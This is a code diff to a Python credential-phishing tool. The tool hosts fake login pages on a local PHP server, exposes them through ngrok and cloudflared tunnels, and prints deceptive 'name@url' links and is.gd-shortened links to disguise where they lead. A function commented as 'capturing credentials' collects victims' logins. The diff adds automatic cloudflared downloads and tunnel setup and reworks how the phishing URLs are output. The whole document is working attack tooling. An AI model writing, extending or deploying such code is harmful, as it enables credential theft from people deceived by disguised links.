@@ -102,6 +102,10 @@ white="\033[0;37m"
 
 root= popen("cd $HOME && pwd").read().strip()
 socket.setdefaulttimeout(30)
+if os.path.exists("/data/data/com.termux/files/home"):
+    termux=True
+else:
+    termux=False
 
 ask = green + '[' + white + '?' + green + '] '+ yellow
 success = yellow + '[' + white + '√' + yellow + '] '+green
@@ -156,7 +160,16 @@ def killer():
     if system("pidof php > /dev/null 2>&1")==0:
         system("killall php")
     if system("pidof ngrok > /dev/null 2>&1")==0:
-        system("killall ngrok")    
+        system("killall ngrok")
+    if system("pidof cloudflared > /dev/null 2>&1")==0:
+        system("killall cloudflared")
+    if system("pidof curl > /dev/null 2>&1")==0:
+        system("killall curl")
+    if system("pidof wget > /dev/null 2>&1")==0:
+        system("killall wget")
+    if system("pidof unzip > /dev/null 2>&1")==0:
+        system("killall unzip")
+
 
 # Download progressbar
 def reporthook(blocknum, blocksize, totalsize):
@@ -194,6 +207,12 @@ def internet(host="8.8.8.8", port=53, timeout=5):
         print(error+"No internet!")
         time.sleep(2)
         internet()
+
+def cuask(url):
+    cust= input("\n"+ask+bcyan+"Wanna try custom link?(y or press enter to skip) > ")
+    if not cust=="":
+        masking(url)
+    waiter()
 
 # Info about tool
 def about():
@@ -485,7 +504,7 @@ def main():
 # 2nd function checking requirements and download files 
 def requirements(folder,mask):
     internet()
-    if os.path.exists("/data/data/com.termux/files/home"):
+    if termux:
         if system("command -v proot  > /dev/null 2>&1")!=0:
             system("pkg install proot -y")
     if system("command -v php > /dev/null 2>&1")!=0:
@@ -543,6 +562,29 @@ def requirements(folder,mask):
             os.remove("file.zip")
             system("chmod +x ngrok && mkdir "+root+"/.ngrokfolder")
             system("mv -f ngrok "+root+"/.ngrokfolder")
+    while not os.path.isfile(root+"/.cffolder/cloudflared"):
+        sprint("\n"+info+"Downloading cloudflared.....")
+        internet()
+        system("rm -rf cloudflared")
+        if x.find("aarch64")!=-1:
+            urlretrieve("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64", "cloudflared", reporthook)
+            system("chmod +x cloudflared && mkdir "+root+"/.cffolder")
+            system("mv -f cloudflared "+root+"/.cffolder")            
+            break
+        if x.find("arm")!=-1:
+            urlretrieve("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm", "cloudflared", reporthook)
+            system("chmod +x cloudflared && mkdir "+root+"/.cffolder")
+            system("mv -f cloudflared "+root+"/.cffolder")            
+            break
+        if x.find("x86_64")!=-1:
+            urlretrieve("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", "cloudflared", reporthook)
+            system("chmod +x cloudflared && mkdir "+root+"/.cffolder")
+            system("mv -f cloudflared "+root+"/.cffolder")
+            break
+        else:
+            urlretrieve("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386", "cloudflared", reporthook)
+            system("chmod +x cloudflared && mkdir "+root+"/.cffolder")
+            system("mv -f cloudflared "+root+"/.cffolder")
     if system("pidof php > /dev/null 2>&1")==0:
         sprint(error+"Previous php still running! Please restart terminal and try again")
         exit()
@@ -581,9 +623,6 @@ def requirements(folder,mask):
     system("mv -f .info.txt $HOME/.site")
     system("clear")
     slowprint(logo)
-    if root.find("termux")!=-1:
-        sprint("\n"+info+blue+"If you haven't enabled hotspot, please enable it!")
-        sleep(3)
     sprint("\n"+info2+"Initializing PHP server at localhost:8080....")
     internet()
     system("cd $HOME/.site && php -S 127.0.0.1:8080 > /dev/null 2>&1 &")
@@ -596,47 +635,56 @@ def requirements(folder,mask):
             sprint(error+"PHP Error")
             killer()
             exit(1)
-    sprint("\n"+info2+"Initializing Ngrok at same address.....")
+    sprint("\n"+info2+"Initializing tunnelers at same address.....")
     internet()
+    system("rm -rf $HOME/.cffolder/log.txt")
     while True:
         if system("command -v termux-chroot > /dev/null 2>&1")==0:
             system("cd $HOME/.ngrokfolder && termux-chroot ./ngrok http 127.0.0.1:8080 > /dev/null 2>&1 &")
+            system("cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url 127.0.0.1:8080 --logfile log.txt > /dev/null 2>&1 &")
             break
         else:    
             system("cd $HOME/.ngrokfolder && ./ngrok http 127.0.0.1:8080 > /dev/null 2>&1 &")
+            system("cd $HOME/.cffolder && ./cloudflared tunnel -url 127.0.0.1:8080 --logfile log.txt > /dev/null 2>&1 &")
             break
-    if os.path.exists("/data/data/com.termux/files/home"):
-        internet()
-        l=0
-        while l<10:
-            l+=1
-            if os.popen("curl -s http://127.0.0.1:4040/api/tunnels").read().find("ngrok")!=-1:
-                sprint("\n"+info+"Ngrok has started successfully!")
-                sleep(1)
-                capture()
-            else:
-                sleep(1)
-        sprint("\n"+error+"Ngrok error. Turn on hotspot and restart termux!")
-        killer()
-        exit(1)
+    sleep(9)
+    ngroklink=popen("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[-0-9a-z]*\.ngrok.io'").read()
+    if ngroklink.find("ngrok")!=-1:
+        ngrokcheck=True
     else:
-        internet()
-        k=0
-        while k<10:
-            k+=1
-            if os.popen("curl -s http://127.0.0.1:4040/api/tunnels").read().find("ngrok")!=-1:
-                sprint("\n"+info+"Ngrok has started successfully!")
-                sleep(1)
-                capture()
-            else:
-                sleep(1)        
-        sprint("\n"+error+"Ngrok can't start!")
-        killer()
-        exit(1)
+        ngrokcheck=False
+    cflink=popen("cat $HOME/.cffolder/log.txt | grep -o 'https://[-0-9a-z]*\.trycloudflare.com'").read()
+    if cflink.find("cloudflare")!=-1:
+        cfcheck=True
+    else:
+        cfcheck=False
+    while True:
+        if ngrokcheck and cfcheck:
+            url_manager(cflink, "1", "2")
+            url_manager(ngroklink, "3", "4")
+            cuask(cflink)
+            break
+        elif not ngrokcheck and cfcheck:
+            url_manager(cflink, "1", "2")
+            cuask(cflink)
+            break
+        elif not cfcheck and ngrokcheck:
+            url_manager(ngroklink, "1", "2")
+            cuask(ngroklink)
+            break
+        elif not (cfcheck and ngrokcheck):
+            sprint(error+"Tunneling falied!")
+            killer()
+            exit()
+        else:
+            sprint(error+"Unknown error!")
+            killer()
+            exit()
+    
 
 # Optional function for ngrok url masking
-def masking(ngurl):
-    website= "https://is.gd/create.php\?format\=simple\&url\="+ngurl
+def masking(url):
+    website= "https://is.gd/create.php\?format\=simple\&url\="+url
     internet()
     main1= os.popen("curl -s "+website)
     main2=main1.read()
@@ -687,33 +735,16 @@ def masking(ngurl):
         waiter()
 
 # Output urls and ask for custom masking
-def capture():
+def url_manager(url,num1,num2):
     internet()
-    os.system("wget -O tunnels.json http://localhost:4040/api/tunnels > /dev/null 2>&1")
-    with open('tunnels.json') as data_file:    
-        datajson = json.load(data_file)
-    os.remove("tunnels.json")
-    os.system("rm -rf "+root+"/.site/ip.txt")
-    for i in datajson['tunnels']:
-       ngurl = i['public_url']
-    if ngurl=="":
-        sprint(error+"Ngrok Error!")
-        killer()
-        exit(1)
-    if not ngurl.find("https")!=-1:      
-        ngurl=ngurl.replace("http","https")   
-
     with open(root+"/.site/.info.txt", "r") as inform:
         masked=inform.read()
         
     sprint("\n"+success+"Your urls are given below: \n")
     system("rm -rf $HOME/.site/ip.txt")
-    sprint(info2+"URL 1 > "+yellow+ngurl)
-    sprint("\n"+info2+"URL 2 > "+yellow+masked.strip()+"@"+ngurl.replace("https://",""))
-    cust= input("\n"+ask+bcyan+"Wanna try custom link?(y or press enter to skip) > ")
-    if not cust=="":
-        masking(ngurl)
-    waiter()
+    print(info2+"URL "+num1+" > "+yellow+url)
+    print(info2+"URL "+num2+" > "+yellow+masked.strip()+"@"+url.replace("https://",""))
+
 
 # Last function capturing credentials 
 def waiter():
@@ -760,4 +791,4 @@ if __name__ == '__main__':
   except KeyboardInterrupt:
       killer()
       sprint("\n"+info2+"Thanks for using!\n")
-  # If this code helped you, consider staring repository. Your stars encourage me a lot!
+# If this code helped you, consider staring repository. Your stars encourage me a lot!
